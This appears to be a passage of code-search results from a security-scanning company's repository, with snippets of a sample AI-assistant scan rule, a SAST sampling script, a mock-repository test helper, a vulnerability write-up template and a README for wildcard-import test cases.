   'project.sublime-project',","lineNumber":265},{"text":"        'workspace.sublime-workspace',","lineNumber":266},{"text":"        '.DS_Store',","lineNumber":267},{"text":"        'Thumbs.db',","lineNumber":268},{"text":"        // Coverage and build artifacts","lineNumber":269},{"text":"        'coverage.lcov',","lineNumber":270},{"text":"        'app.exe',","lineNumber":271},{"text":"        'library.dll',","lineNumber":272},{"text":"        'libmath.so',","lineNumber":273},{"text":"        'framework.dylib',","lineNumber":274},{"text":"        'Main.class',","lineNumber":275},{"text":"        'module.pyc',","lineNumber":276},{"text":"        'cache.pyo',","lineNumber":277},{"text":"        'object.o',","lineNumber":278},{"text":"        'binary.obj',","lineNumber":279},{"text":"        // Minified and bundled files (even with supported extensions)","lineNumber":280},{"text":"        'jquery.min.js',","lineNumber":281},{"text":"        'bootstrap.min.css',","lineNumber":282},{"text":"        'index.min.html'","lineNumber":283},{"text":",","lineNumber":371},{"text":"      ]","lineNumber":372},{"text":"    }","lineNumber":377},{"text":"  }","lineNumber":520},{"text":"}","lineNumber":1262}]},"score":0.2807697057723999},{"codeBlock":{"relativeWorkspacePath":"services/app/src/components/Analysis/collapsible/GenerateAIRule.tsx","range":{"startPosition":{},"endPosition":{"line":153,"column":1}},"contents":"import { useToast } from '@mobb/app/context/toast'\\nimport {\\n  Button,\\n  Dialog,\\n  Flex,\\n  keyframes,\\n  RawButton,\\n  styled,\\n  SvgCross,\\n  Text,\\n} from '@mobb/components'\\nimport { useState } from 'react'\\nimport { useSearchParams } from 'react-router-dom'\\n\\nconst sampleRule = \`---\\nalwaysApply: true\\n---\\n# Security Rules for Mobb Vulnerability Scanning\\n## MANDATORY: Mobb Scan Protocol\\n**CRITICAL**: After implementing any new features or making code changes, you MUST:\\n1. **ALWAYS run Mobb scan after implementation**: Use \\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\` tool to scan the new/modified code\\n2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\`.cursor/rules/\\\\\` to prevent the vulnerability type from recurring\\n3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found\\n## Rule Addition Protocol\\nWhen Mobb produces a fix:\\n- Extract the vulnerability type (e.g., \\"Command Injection\\", \\"SQL Injection\\", \\"XSS\\")\\n- Create a generic prevention rule for that vulnerability type\\n- **If rule file exists**: Add new information to the existing \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` file\\n- **If rule file doesn't exist**: Create a new rule file: \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` (e.g., \\\\\`command-injection.mdc\\\\\`)\\n- Add the rule with clear, actionable guidance and \\\\\`alwaysApply: true\\\\\`\\n- Make the rule specific enough to prevent the issue but generic enough to apply broadly\\n- Update the main security.mdc to reference the rule file (if it's new)\\n## Active Security Rules\\n## Enforcement\\n- This rule is ALWAYS APPLIED and cannot be bypassed\\n- Any AI assistant that fails to follow this protocol should be corrected immediately\\n- Team members should verify that security scans are run before code reviews\`","originalContents":"import { useToast } from '@mobb/app/context/toast'\\nimport {\\n  Button,\\n  Dialog,\\n  Flex,\\n  keyframes,\\n  RawButton,\\n  styled,\\n  SvgCross,\\n  Text,\\n} from '@mobb/components'\\nimport { useState } from 'react'\\nimport { useSearchParams } from 'react-router-dom'\\n\\nconst sampleRule = \`---\\nalwaysApply: true\\n---\\n# Security Rules for Mobb Vulnerability Scanning\\n## MANDATORY: Mobb Scan Protocol\\n**CRITICAL**: After implementing any new features or making code changes, you MUST:\\n1. **ALWAYS run Mobb scan after implementation**: Use \\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\` tool to scan the new/modified code\\n2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\`.cursor/rules/\\\\\` to prevent the vulnerability type from recurring\\n3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found\\n## Rule Addition Protocol\\nWhen Mobb produces a fix:\\n- Extract the vulnerability type (e.g., \\"Command Injection\\", \\"SQL Injection\\", \\"XSS\\")\\n- Create a generic prevention rule for that vulnerability type\\n- **If rule file exists**: Add new information to the existing \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` file\\n- **If rule file doesn't exist**: Create a new rule file: \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` (e.g., \\\\\`command-injection.mdc\\\\\`)\\n- Add the rule with clear, actionable guidance and \\\\\`alwaysApply: true\\\\\`\\n- Make the rule specific enough to prevent the issue but generic enough to apply broadly\\n- Update the main security.mdc to reference the rule file (if it's new)\\n## Active Security Rules\\n## Enforcement\\n- This rule is ALWAYS APPLIED and cannot be bypassed\\n- Any AI assistant that fails to follow this protocol should be corrected immediately\\n- Team members should verify that security scans are run before code reviews\`","detailedLines":[{"text":"import { useToast } from '@mobb/app/context/toast'","lineNumber":1},{"text":"import {","lineNumber":2},{"text":"  Button,","lineNumber":3},{"text":"  Dialog,","lineNumber":4},{"text":"  Flex,","lineNumber":5},{"text":"  keyframes,","lineNumber":6},{"text":"  RawButton,","lineNumber":7},{"text":"  styled,","lineNumber":8},{"text":"  SvgCross,","lineNumber":9},{"text":"  Text,","lineNumber":10},{"text":"} from '@mobb/components'","lineNumber":11},{"text":"import { useState } from 'react'","lineNumber":12},{"text":"import { useSearchParams } from 'react-router-dom'","lineNumber":13},{"lineNumber":14},{"text":"const sampleRule = \`---","lineNumber":15},{"text":"alwaysApply: true","lineNumber":16},{"text":"---","lineNumber":17},{"text":"# Security Rules for Mobb Vulnerability Scanning","lineNumber":18},{"text":"## MANDATORY: Mobb Scan Protocol","lineNumber":19},{"text":"**CRITICAL**: After implementing any new features or making code changes, you MUST:","lineNumber":20},{"text":"1. **ALWAYS run Mobb scan after implementation**: Use \\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\` tool to scan the new/modified code","lineNumber":21},{"text":"2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\`.cursor/rules/\\\\\` to prevent the vulnerability type from recurring","lineNumber":22},{"text":"3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found","lineNumber":23},{"text":"## Rule Addition Protocol","lineNumber":24},{"text":"When Mobb produces a fix:","lineNumber":25},{"text":"- Extract the vulnerability type (e.g., \\"Command Injection\\", \\"SQL Injection\\", \\"XSS\\")","lineNumber":26},{"text":"- Create a generic prevention rule for that vulnerability type","lineNumber":27},{"text":"- **If rule file exists**: Add new information to the existing \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` file","lineNumber":28},{"text":"- **If rule file doesn't exist**: Create a new rule file: \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` (e.g., \\\\\`command-injection.mdc\\\\\`)","lineNumber":29},{"text":"- Add the rule with clear, actionable guidance and \\\\\`alwaysApply: true\\\\\`","lineNumber":30},{"text":"- Make the rule specific enough to prevent the issue but generic enough to apply broadly","lineNumber":31},{"text":"- Update the main security.mdc to reference the rule file (if it's new)","lineNumber":32},{"text":"## Active Security Rules","lineNumber":33},{"text":"## Enforcement","lineNumber":34},{"text":"- This rule is ALWAYS APPLIED and cannot be bypassed","lineNumber":35},{"text":"- Any AI assistant that fails to follow this protocol should be corrected immediately","lineNumber":36},{"text":"- Team members should verify that security scans are run before code reviews\`","lineNumber":37},{"lineNumber":38},{"text":"export function GenerateAIRule() {","lineNumber":39,"isSignature":true},{"text":"  const [searchParams] = useSearchParams()","lineNumber":40},{"text":"}","lineNumber":154,"isSignature":true}]},"score":0.28029704093933105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":233},"endPosition":{"line":339}},"contents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","originalContents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","detailedLines":[{"text":"@dataclass","lineNumber":234},{"text":"class Sample:","lineNumber":235,"isSignature":true},{"lineNumber":237},{"text":"    report_path: str","lineNumber":238},{"text":"    source_archive_path: str","lineNumber":239},{"text":"    is_public: bool","lineNumber":240,"isSignature":true},{"lineNumber":241},{"lineNumber":242},{"text":"async def main(","lineNumber":243,"isSignature":true},{"text":"    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),","lineNumber":244,"isSignature":true},{"text":"):","lineNumber":245,"isSignature":true},{"text":"    with open(input_config_abs_path, \\"r\\") as f:","lineNumber":246},{"text":"        input_config = SamplerConfig.from_json(f.read())","lineNumber":247},{"lineNumber":248},{"text":"    print(f\\"Sampler config: {input_config}\\")","lineNumber":249},{"text":"    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")","lineNumber":250},{"lineNumber":251},{"text":"    samples = []","lineNumber":252},{"lineNumber":253},{"text":"    samples += await _get_customer_report_samples(input_config)","lineNumber":254},{"text":"    samples += await _get_dataset_samples(input_config)","lineNumber":255},{"lineNumber":256},{"text":"    samples = samples[0 : input_config.max_sample_count]","lineNumber":257},{"lineNumber":258},{"text":"    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])","lineNumber":259},{"lineNumber":260},{"text":"    if sast_issue_type_used != set(input_config.sast_issue_types):","lineNumber":261},{"text":"        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used","lineNumber":262},{"text":"        print(","lineNumber":263},{"text":"            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"","lineNumber":264},{"text":"        )","lineNumber":265},{"lineNumber":266},{"text":"    await _save_output(input_config, samples)","lineNumber":267},{"text":"    print(\\"Done\\")","lineNumber":268,"isSignature":true},{"lineNumber":269},{"lineNumber":270},{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    ","lineNumber":272}]},"score":0.2794812321662903},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/helpers/MockRepo.ts","range":{"startPosition":{},"endPosition":{"line":464,"column":1}},"contents":"import * as path2 from 'node:path'\\n\\nimport { execFileSync, execSync } from 'child_process'\\nimport fs, {\\n  existsSync,\\n  mkdirSync,\\n  mkdtempSync,\\n  readFileSync,\\n  rmSync,\\n  utimesSync,\\n  writeFileSync,\\n} from 'fs'\\nimport { tmpdir } from 'os'\\nimport { dirname, join } from 'path'\\nimport simpleGit from 'simple-git'\\n\\nimport { benignFileContent } from './fileContents'\\nimport { log } from './log'\\n\\n/**\\n * Base MockRepo class that encapsulates helper methods for creating and cleaning up\\n * temporary repositories that are used throughout the test suites.\\n */\\nexport class MockRepo {\\n  /** Holds the path of the temporary repository managed by this instance */\\n  protected readonly repoPath: string\\n\\n  /** Holds the remote URL of the repository (if it's a git repo) */\\n  protected repoUrl: string = ''\\n\\n  /** Default set of sample files used by multiple helpers */\\n  protected readonly sampleFiles: string[] = [\\n    'sample1.py',\\n    'dir/sample2.py',\\n    'dir/dir2/sample3.py',\\n  ]\\n\\n  /** The list of files to create in the repository */\\n  protected readonly files: string[]\\n\\n  /** Path to the sample .gitignore file */\\n  protected readonly sampleGitignorePath = join(\\n    __dirname,\\n    '..',\\n    'mocks',\\n    'sample.gitignore'\\n  )\\n\\n  /**\\n   * Creates a new MockRepo instance\\n   * @param files Optional list of files to create in the repository (defaults to sampleFiles)\\n   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.\\n   */\\n  constructor(files?: string[], customPath?: string) {\\n    // Use provided files or default to sampleFiles\\n    this.files = files || this.sampleFiles\\n\\n    // Use custom path or create a temporary directory\\n    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))\\n    log('Created repository directory at:', this.repoPath)\\n  }","originalContents":"import * as path2 from 'node:path'\\n\\nimport { execFileSync, execSync } from 'child_process'\\nimport fs, {\\n  existsSync,\\n  mkdirSync,\\n  mkdtempSync,\\n  readFileSync,\\n  rmSync,\\n  utimesSync,\\n  writeFileSync,\\n} from 'fs'\\nimport { tmpdir } from 'os'\\nimport { dirname, join } from 'path'\\nimport simpleGit from 'simple-git'\\n\\nimport { benignFileContent } from './fileContents'\\nimport { log } from './log'\\n\\n/**\\n * Base MockRepo class that encapsulates helper methods for creating and cleaning up\\n * temporary repositories that are used throughout the test suites.\\n */\\nexport class MockRepo {\\n  /** Holds the path of the temporary repository managed by this instance */\\n  protected readonly repoPath: string\\n\\n  /** Holds the remote URL of the repository (if it's a git repo) */\\n  protected repoUrl: string = ''\\n\\n  /** Default set of sample files used by multiple helpers */\\n  protected readonly sampleFiles: string[] = [\\n    'sample1.py',\\n    'dir/sample2.py',\\n    'dir/dir2/sample3.py',\\n  ]\\n\\n  /** The list of files to create in the repository */\\n  protected readonly files: string[]\\n\\n  /** Path to the sample .gitignore file */\\n  protected readonly sampleGitignorePath = join(\\n    __dirname,\\n    '..',\\n    'mocks',\\n    'sample.gitignore'\\n  )\\n\\n  /**\\n   * Creates a new MockRepo instance\\n   * @param files Optional list of files to create in the repository (defaults to sampleFiles)\\n   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.\\n   */\\n  constructor(files?: string[], customPath?: string) {\\n    // Use provided files or default to sampleFiles\\n    this.files = files || this.sampleFiles\\n\\n    // Use custom path or create a temporary directory\\n    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))\\n    log('Created repository directory at:', this.repoPath)\\n  }","detailedLines":[{"text":"import * as path2 from 'node:path'","lineNumber":1},{"lineNumber":2},{"text":"import { execFileSync, execSync } from 'child_process'","lineNumber":3},{"text":"import fs, {","lineNumber":4},{"text":"  existsSync,","lineNumber":5},{"text":"  mkdirSync,","lineNumber":6},{"text":"  mkdtempSync,","lineNumber":7},{"text":"  readFileSync,","lineNumber":8},{"text":"  rmSync,","lineNumber":9},{"text":"  utimesSync,","lineNumber":10},{"text":"  writeFileSync,","lineNumber":11},{"text":"} from 'fs'","lineNumber":12},{"text":"import { tmpdir } from 'os'","lineNumber":13},{"text":"import { dirname, join } from 'path'","lineNumber":14},{"text":"import simpleGit from 'simple-git'","lineNumber":15},{"lineNumber":16},{"text":"import { benignFileContent } from './fileContents'","lineNumber":17},{"text":"import { log } from './log'","lineNumber":18},{"lineNumber":19},{"text":"/**","lineNumber":20},{"text":" * Base MockRepo class that encapsulates helper methods for creating and cleaning up","lineNumber":21},{"text":" * temporary repositories that are used throughout the test suites.","lineNumber":22},{"text":" */","lineNumber":23},{"text":"export class MockRepo {","lineNumber":24,"isSignature":true},{"text":"  /** Holds the path of the temporary repository managed by this instance */","lineNumber":25},{"text":"  protected readonly repoPath: string","lineNumber":26},{"lineNumber":27},{"text":"  /** Holds the remote URL of the repository (if it's a git repo) */","lineNumber":28},{"text":"  protected repoUrl: string = ''","lineNumber":29},{"lineNumber":30},{"text":"  /** Default set of sample files used by multiple helpers */","lineNumber":31},{"text":"  protected readonly sampleFiles: string[] = [","lineNumber":32},{"text":"    'sample1.py',","lineNumber":33},{"text":"    'dir/sample2.py',","lineNumber":34},{"text":"    'dir/dir2/sample3.py',","lineNumber":35},{"text":"  ]","lineNumber":36},{"lineNumber":37},{"text":"  /** The list of files to create in the repository */","lineNumber":38},{"text":"  protected readonly files: string[]","lineNumber":39},{"lineNumber":40},{"text":"  /** Path to the sample .gitignore file */","lineNumber":41},{"text":"  protected readonly sampleGitignorePath = join(","lineNumber":42},{"text":"    __dirname,","lineNumber":43},{"text":"    '..',","lineNumber":44},{"text":"    'mocks',","lineNumber":45},{"text":"    'sample.gitignore'","lineNumber":46},{"text":"  )","lineNumber":47},{"lineNumber":48},{"text":"  /**","lineNumber":49},{"text":"   * Creates a new MockRepo instance","lineNumber":50},{"text":"   * @param files Optional list of files to create in the repository (defaults to sampleFiles)","lineNumber":51},{"text":"   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.","lineNumber":52},{"text":"   */","lineNumber":53},{"text":"  constructor(files?: string[], customPath?: string) {","lineNumber":54},{"text":"    // Use provided files or default to sampleFiles","lineNumber":55},{"text":"    this.files = files || this.sampleFiles","lineNumber":56},{"lineNumber":57},{"text":"    // Use custom path or create a temporary directory","lineNumber":58},{"text":"    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))","lineNumber":59},{"text":"    log('Created repository directory at:', this.repoPath)","lineNumber":60},{"text":"  }","lineNumber":61},{"lineNumber":62},{"text":"  /**","lineNumber":63},{"text":"   * Returns the path to the created repository","lineNumber":64},{"text":"   * @returns Path to the repository","lineNumber":65},{"text":"   */","lineNumber":66},{"text":"}","lineNumber":465,"isSignature":true}]},"score":0.27924689650535583},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/templates/vulnerability_template.md.txt","range":{"startPosition":{},"endPosition":{"line":62}},"contents":"# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n### Detected by\\n\\n* [Add screenshots from highlight nodes here]\\n\\n### Respected by\\n\\n* SAST provider name\\n* ...\\n\\n## 5. Other Information\\n\\n### Required Imports and Packages\\n\\nNone\\n\\n### User Questions\\n\\nNone\\n\\n### Open Items\\n\\nNone\\n\\n### Read More\\n\\n* https://deu.ast.checkmarx.net/presets/sast\\n* https://codeql.github.com/codeql-query-help/python/\\n* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak\\n* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity\\n* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules\\n* https://rules.sonarsource.com/python/\\n","originalContents":"# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n### Detected by\\n\\n* [Add screenshots from highlight nodes here]\\n\\n### Respected by\\n\\n* SAST provider name\\n* ...\\n\\n## 5. Other Information\\n\\n### Required Imports and Packages\\n\\nNone\\n\\n### User Questions\\n\\nNone\\n\\n### Open Items\\n\\nNone\\n\\n### Read More\\n\\n* https://deu.ast.checkmarx.net/presets/sast\\n* https://codeql.github.com/codeql-query-help/python/\\n* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak\\n* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity\\n* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules\\n* https://rules.sonarsource.com/python/\\n","detailedLines":[{"text":"# {vuln_name}","lineNumber":1},{"lineNumber":2},{"text":"## 1. Vulnerability Description","lineNumber":3},{"lineNumber":4},{"text":"[Describe the vulnerability here]","lineNumber":5},{"lineNumber":6},{"text":"## 2. How It Works","lineNumber":7},{"lineNumber":8},{"text":"[Explain how the vulnerability works]","lineNumber":9},{"lineNumber":10},{"text":"## 3. Vulnerable Code Examples","lineNumber":11},{"lineNumber":12},{"text":"### Example 1","lineNumber":13},{"text":"\`\`\`{language}","lineNumber":14},{"text":"// Add vulnerable code example here","lineNumber":15},{"text":"\`\`\`","lineNumber":16},{"lineNumber":17},{"text":"## 4. Remediation Strategies","lineNumber":18},{"lineNumber":19},{"text":"### Safe Code Examples","lineNumber":20},{"text":"\`\`\`{language}","lineNumber":21},{"text":"// Add safe code example here","lineNumber":22},{"text":"\`\`\`","lineNumber":23},{"lineNumber":24},{"text":"## 5. False Positives Detection","lineNumber":25},{"lineNumber":26},{"text":"### More Safe Code Examples","lineNumber":27},{"text":"\`\`\`{language}","lineNumber":28},{"text":"// Add more safe code example here or refer to previous examples","lineNumber":29},{"text":"\`\`\`","lineNumber":30},{"lineNumber":31},{"text":"### Detected by","lineNumber":32},{"lineNumber":33},{"text":"* [Add screenshots from highlight nodes here]","lineNumber":34},{"lineNumber":35},{"text":"### Respected by","lineNumber":36},{"lineNumber":37},{"text":"* SAST provider name","lineNumber":38},{"text":"* ...","lineNumber":39},{"lineNumber":40},{"text":"## 5. Other Information","lineNumber":41},{"lineNumber":42},{"text":"### Required Imports and Packages","lineNumber":43},{"lineNumber":44},{"text":"None","lineNumber":45},{"lineNumber":46},{"text":"### User Questions","lineNumber":47},{"lineNumber":48},{"text":"None","lineNumber":49},{"lineNumber":50},{"text":"### Open Items","lineNumber":51},{"lineNumber":52},{"text":"None","lineNumber":53},{"lineNumber":54},{"text":"### Read More","lineNumber":55},{"lineNumber":56},{"text":"* https://deu.ast.checkmarx.net/presets/sast","lineNumber":57},{"text":"* https://codeql.github.com/codeql-query-help/python/","lineNumber":58},{"text":"* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak","lineNumber":59},{"text":"* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity","lineNumber":60},{"text":"* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules","lineNumber":61},{"text":"* https://rules.sonarsource.com/python/","lineNumber":62}]},"score":0.2715897858142853},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/python/wildcard_imports/README.md","range":{"startPosition":{},"endPosition":{"line":50}},"contents":"# Python Wildcard Import Test Cases\\n\\nThis directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.\\n\\n## Test Cases\\n\\n### 1. basic_math\\n- **File**: \`calculator.py\`\\n- **Description**: Basic usage of wildcard import from the \`math\` module\\n- **Pattern**: \`from math import *\`\\n- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`\\n\\n### 2. collections_abc\\n- **File**: \`containers.py\`\\n- **Description**: Wildcard imports from \`collections\` and abstract base classes\\n- **Patterns**: \\n  - \`from collections import *\`\\n  - \`from collections.abc import *\`\\n  - \`from abc import *\`\\n- **Usage**: Container types, abstract base classes, decorators\\n\\n### 3. datetime_time\\n- **File**: \`scheduler.py\`\\n- **Description**: Time and date manipulation with multiple wildcard imports\\n- **Patterns**:\\n  - \`from datetime import *\`\\n  - \`from time import *\`\\n  - \`from calendar import *\`\\n- **Usage**: Scheduling, time zones, calendar operations\\n\\n### 4. fabric_deployment\\n- **File**: \`deploy.py\`\\n- **Description**: Real-world deployment script using Fabric with extensive functionality\\n- **Pattern**: \`from fabric.api import *\`\\n- **Usage**: Server deployment automation with 400+ lines of deployment logic\\n- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import\\n\\n### 5. local_package\\n- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`\\n- **Description**: Wildcard imports from local modules in the same package\\n- **Patterns**:\\n  - \`from utils import *\`\\n  - \`from helpers import *\`\\n- **Usage**: Application using various utilities and helper functions from local modules\\n\\n### 6. mixed_imports\\n- **File**: \`hybrid_imports.py\`\\n- **Description**: Mixing wildcard imports with explicit imports\\n","originalContents":"# Python Wildcard Import Test Cases\\n\\nThis directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.\\n\\n## Test Cases\\n\\n### 1. basic_math\\n- **File**: \`calculator.py\`\\n- **Description**: Basic usage of wildcard import from the \`math\` module\\n- **Pattern**: \`from math import *\`\\n- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`\\n\\n### 2. collections_abc\\n- **File**: \`containers.py\`\\n- **Description**: Wildcard imports from \`collections\` and abstract base classes\\n- **Patterns**: \\n  - \`from collections import *\`\\n  - \`from collections.abc import *\`\\n  - \`from abc import *\`\\n- **Usage**: Container types, abstract base classes, decorators\\n\\n### 3. datetime_time\\n- **File**: \`scheduler.py\`\\n- **Description**: Time and date manipulation with multiple wildcard imports\\n- **Patterns**:\\n  - \`from datetime import *\`\\n  - \`from time import *\`\\n  - \`from calendar import *\`\\n- **Usage**: Scheduling, time zones, calendar operations\\n\\n### 4. fabric_deployment\\n- **File**: \`deploy.py\`\\n- **Description**: Real-world deployment script using Fabric with extensive functionality\\n- **Pattern**: \`from fabric.api import *\`\\n- **Usage**: Server deployment automation with 400+ lines of deployment logic\\n- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import\\n\\n### 5. local_package\\n- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`\\n- **Description**: Wildcard imports from local modules in the same package\\n- **Patterns**:\\n  - \`from utils import *\`\\n  - \`from helpers import *\`\\n- **Usage**: Application using various utilities and helper functions from local modules\\n\\n### 6. mixed_imports\\n- **File**: \`hybrid_imports.py\`\\n- **Description**: Mixing wildcard imports with explicit imports\\n","detailedLines":[{"text":"# Python Wildcard Import Test Cases","lineNumber":1},{"lineNumber":2},{"text":"This directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.","lineNumber":3},{"lineNumber":4},{"text":"## Test Cases","lineNumber":5},{"lineNumber":6},{"text":"### 1. basic_math","lineNumber":7},{"text":"- **File**: \`calculator.py\`","lineNumber":8},{"text":"- **Description**: Basic usage of wildcard import from the \`math\` module","lineNumber":9},{"text":"- **Pattern**: \`from math import *\`","lineNumber":10},{"text":"- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`","lineNumber":11},{"lineNumber":12},{"text":"### 2. collections_abc","lineNumber":13},{"text":"- **File**: \`containers.py\`","lineNumber":14},{"text":"- **Description**: Wildcard imports from \`collections\` and abstract base classes","lineNumber":15},{"text":"- **Patterns**: ","lineNumber":16},{"text":"  - \`from collections import *\`","lineNumber":17},{"text":"  - \`from collections.abc import *\`","lineNumber":18},{"text":"  - \`from abc import *\`","lineNumber":19},{"text":"- **Usage**: Container types, abstract base classes, decorators","lineNumber":20},{"lineNumber":21},{"text":"### 3. datetime_time","lineNumber":22},{"text":"- **File**: \`scheduler.py\`","lineNumber":23},{"text":"- **Description**: Time and date manipulation with multiple wildcard imports","lineNumber":24},{"text":"- **Patterns**:","lineNumber":25},{"text":"  - \`from datetime import *\`","lineNumber":26},{"text":"  - \`from time import *\`","lineNumber":27},{"text":"  - \`from calendar import *\`","lineNumber":28},{"text":"- **Usage**: Scheduling, time zones, calendar operations","lineNumber":29},{"lineNumber":30},{"text":"### 4. fabric_deployment","lineNumber":31},{"text":"- **File**: \`deploy.py\`","lineNumber":32},{"text":"- **Description**: Real-world deployment script using Fabric with extensive functionality","lineNumber":33},{"text":"- **Pattern**: \`from fabric.api import *\`","lineNumber":34},{"text":"- **Usage**: Server deployment automation with 400+ lines of deployment logic","lineNumber":35},{"text":"- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import","lineNumber":36},{"lineNumber":37},{"text":"### 5. local_package","lineNumber":38},{"text":"- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`","lineNumber":39},{"text":"- **Description**: Wildcard imports from local modules in the same package","lineNumber":40},{"text":"- **Patterns**:","lineNumber":41},{"text":"  - \`from utils import *\`","lineNumber":42},{"text":"  - \`from helpers import *\`","lineNumber":43},{"text":"- **Usage**: Application using various utilities and helper functions from local modules","lineNumber":44},{"lineNumber":45},{"text":"### 6. mixed_imports","lineNumber":46},{"text":"- **File**: 